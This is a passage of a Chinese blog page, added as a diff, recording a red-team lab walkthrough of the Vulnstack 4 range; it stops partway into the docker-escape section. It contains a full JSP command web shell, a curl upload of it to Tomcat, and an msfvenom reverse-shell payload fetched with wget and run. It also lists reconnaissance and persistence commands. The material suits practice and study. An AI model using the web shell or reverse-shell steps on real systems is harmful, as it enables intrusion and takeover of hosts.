@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"byzain.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false,"path":"search.xml","field":"post","content":true,"format":"html"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="环境下载地址红队靶场 Vlunstack 4 的打靶记录 http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队环境(Vulnstack4)">
+<meta property="og:url" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/index.html">
+<meta property="og:site_name" content="Zain">
+<meta property="og:description" content="环境下载地址红队靶场 Vlunstack 4 的打靶记录 http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/e99c0b34daafee7ec78f86a6556edbce.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/715aa6cccca58dc7a364706be8fa2d60.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/5105fb2b993a855c8bcef67a84b0c689.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/2f9b538decf6548915c45b9f29e57c5e.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/d5e663662f7726d1cf86b1ee89668cf9.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/06963f89d3658ac452935f975d35d704.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/14b4571e9f03498a5bfe3a089dab5947.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/f23fe8bc79c7b7917cbb04f8bf27a231.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/3174788fb0670c44a30563a1db32fc7a.png">
+<meta property="og:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/a8e3a6217a132d777b4bde180d3d4ad4.png">
+<meta property="article:published_time" content="2021-01-04T10:36:37.000Z">
+<meta property="article:modified_time" content="2024-11-04T12:01:42.199Z">
+<meta property="article:author" content="Zain">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="内网安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/e99c0b34daafee7ec78f86a6556edbce.png">
+
+
+<link rel="canonical" href="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/","path":"红队环境-Vulnstack4/","title":"红队环境(Vulnstack4)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>红队环境(Vulnstack4) | Zain</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><script src="/js/cherrybg.js"></script>
+  <div class="headband"></div>
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Zain</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">斜杠青年</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="nav-number">1.</span> <span class="nav-text">环境下载地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AAshell"><span class="nav-number">2.</span> <span class="nav-text">第一个shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">2.1.</span> <span class="nav-text">目标端口探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.</span> <span class="nav-text">寻找漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.3.</span> <span class="nav-text">利用漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8tomcat"><span class="nav-number">2.3.1.</span> <span class="nav-text">利用tomcat</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E9%AB%98%E7%BA%A7shell"><span class="nav-number">2.4.</span> <span class="nav-text">获得高级shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">2.4.1.</span> <span class="nav-text">操作方式：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.5.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-number">2.6.</span> <span class="nav-text">持久化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AAshell"><span class="nav-number">3.</span> <span class="nav-text">第二个shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95docker%E9%80%83%E9%80%B8"><span class="nav-number">3.1.</span> <span class="nav-text">尝试docker逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%9D%E8%AF%951"><span class="nav-number">3.1.1.</span> <span class="nav-text">尝试1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%9D%E8%AF%952"><span class="nav-number">3.1.2.</span> <span class="nav-text">尝试2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E5%AF%86%E9%92%A5"><span class="nav-number">3.1.3.</span> <span class="nav-text">写入密钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.1.4.</span> <span class="nav-text">信息收集</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91"><span class="nav-number">4.</span> <span class="nav-text">横向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.1.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86"><span class="nav-number">4.2.</span> <span class="nav-text">创建代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.3.</span> <span class="nav-text">扫描永恒之蓝漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-number">4.3.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-%E6%8E%A8%E8%8D%90"><span class="nav-number">4.3.2.</span> <span class="nav-text">方法2(推荐)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%8D%E6%9D%83"><span class="nav-number">4.4.</span> <span class="nav-text">降权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.5.</span> <span class="nav-text">域内信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ms14-067%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.6.</span> <span class="nav-text">利用ms14-067攻击域控</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">4.6.1.</span> <span class="nav-text">抓取密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ms14-068%E7%94%9F%E6%88%90%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.6.2.</span> <span class="nav-text">利用ms14-068生成票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">4.6.3.</span> <span class="nav-text">上传mimikatz抓取密码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C"><span class="nav-number">5.</span> <span class="nav-text">完</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Zain</p>
+  <div class="site-description" itemprop="description">总有人正年轻</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/ByZain" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://byzain.github.io/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Zain">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zain">
+      <meta itemprop="description" content="总有人正年轻">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="红队环境(Vulnstack4) | Zain">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红队环境(Vulnstack4)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-04 18:36:37" itemprop="dateCreated datePublished" datetime="2021-01-04T18:36:37+08:00">2021-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-04 20:01:42" itemprop="dateModified" datetime="2024-11-04T20:01:42+08:00">2024-11-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">内网安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="环境下载地址"><a href="#环境下载地址" class="headerlink" title="环境下载地址"></a>环境下载地址</h2><p>红队靶场 Vlunstack 4 的打靶记录</p>
+<p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">涉及到的内容：</span><br><span class="line"></span><br><span class="line">st漏洞利用</span><br><span class="line"></span><br><span class="line">phpmyadmin getshell</span><br><span class="line"></span><br><span class="line">tomcat 漏洞利用</span><br><span class="line"></span><br><span class="line">docker逃逸</span><br><span class="line"></span><br><span class="line">ms14-068</span><br><span class="line"></span><br><span class="line">ssh密钥利用</span><br><span class="line"></span><br><span class="line">流量转发</span><br><span class="line"></span><br><span class="line">历史命令信息泄露</span><br><span class="line"></span><br><span class="line">域渗透</span><br></pre></td></tr></table></figure>
+
+<h2 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h2><h3 id="目标端口探测"><a href="#目标端口探测" class="headerlink" title="目标端口探测"></a>目标端口探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -T4 -sV &lt;target&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit &lt;服务名&gt; &lt;版本号&gt;  //搜索该服务指定版本的漏洞</span><br><span class="line">searchsploit -m &lt;路径&gt;           // 将利用脚本移动到当前目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struts 2</span><br><span class="line">tomcat</span><br><span class="line">phpmyadmin</span><br><span class="line">三选一</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用tomcat"><a href="#利用tomcat" class="headerlink" title="利用tomcat"></a>利用tomcat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// -F &quot;file=@&#123;FILE_NAME&#125;&quot; 指定上传文件</span><br><span class="line">curl -v -X PUT -F &quot;file=@shell.jsp&quot; 192.168.0.105:2002/shell.jsp/</span><br><span class="line"></span><br><span class="line">//或者searchsploit</span><br><span class="line">python3 42966.py -u http://192.168.0.105:2002/ -p pwn</span><br></pre></td></tr></table></figure>
+
+<p>shell.jsp内容如下:</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*,java.net.*&quot;</span>%&gt;&lt;%%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=<span class="string">&quot;POST&quot;</span> NAME=<span class="string">&quot;myform&quot;</span> ACTION=<span class="string">&quot;&quot;</span>&gt;&lt;INPUT TYPE=<span class="string">&quot;text&quot;</span> NAME=<span class="string">&quot;cmd&quot;</span>&gt;&lt;INPUT TYPE=<span class="string">&quot;submit&quot;</span> VALUE=<span class="string">&quot;Send&quot;</span>&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%<span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123; out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;\n&lt;BR&gt;&quot;</span>); <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> p.getOutputStream(); <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> p.getInputStream(); <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(in); <span class="type">String</span> <span class="variable">disr</span> <span class="operator">=</span> dis.readLine(); <span class="keyword">while</span> ( disr != <span class="literal">null</span> ) &#123; out.println(disr); disr = dis.readLine(); &#125; &#125;%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DswCnblog/p/5780389.html">proc目录详解</a></p>
+<h3 id="获得高级shell"><a href="#获得高级shell" class="headerlink" title="获得高级shell"></a>获得高级shell</h3><p>目的：为了方便后渗透集成化操作</p>
+<h4 id="操作方式："><a href="#操作方式：" class="headerlink" title="操作方式："></a>操作方式：</h4><p>生成msf马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=193.122.122.123 LPORT=4444 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>开启http服务提供下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.servers 8080</span><br></pre></td></tr></table></figure>
+
+<p>利用之前上传的shell.jsp执行wget命令下载开启监听然后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.108:8000/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看权限</span><br><span class="line">ifconfig # 查看网络配置</span><br><span class="line">fidsk -l # 查看硬盘</span><br><span class="line">拿到主机权限后要进行主机的信息收集</span><br><span class="line">uname -a # 获取所有版本信息</span><br><span class="line">uname -m # 获取Linux内核架构</span><br><span class="line">cat /proc/version # 获取内核信息</span><br><span class="line">cat /etc/*-release # 发布信息</span><br><span class="line">cat /etc/issue # 发布信息</span><br><span class="line">hostname # 获取主机名</span><br><span class="line">cat /etc/passwd # 列出系统所有用户</span><br><span class="line">cat /etc/group # 列出系统所有组 </span><br><span class="line">w # 查看目前登录的用户</span><br><span class="line">whoami # 查看当前用户 </span><br><span class="line">id # 查看当前用户信息 </span><br><span class="line">sudo -l # 列出目前用户可执行与无法执行的指令 </span><br><span class="line">ps aux # 查看进程信息 </span><br><span class="line">ls -la /etc/cron* # 查看计划任务</span><br><span class="line">ifconfig -a # 列出网络接口信息 </span><br><span class="line">cat /etc/network/interfaces # 列出网络接口信息 </span><br><span class="line">arp -a # 查看系统arp表 </span><br><span class="line">route # 打印路由信息</span><br><span class="line">netstat -anplt # 打印本地端口开放信息 </span><br><span class="line">iptables -L # 列出iptable的配置规则</span><br><span class="line"></span><br><span class="line">常见提权：</span><br><span class="line">sudo</span><br><span class="line">脏牛</span><br></pre></td></tr></table></figure>
+
+<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;run persistence -h</span><br></pre></td></tr></table></figure>
+
+<p>通过ifconfig推测为docker虚拟机，查看cgroup确认是docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cgroup</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二个shell"><a href="#第二个shell" class="headerlink" title="第二个shell"></a>第二个shell</h2><h3 id="尝试docker逃逸"><a href="#尝试docker逃逸" class="headerlink" title="尝试docker逃逸"></a>尝试docker逃逸</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13423853.html">相关文档</a></p>
+<h4 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h4><p><a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">CVE-2019-5736-POC</a>缺点是需要等待管理员重启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>
+
+<h4 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h4><p>利用–privileged特权模式逃逸</p>
+<blockquote>
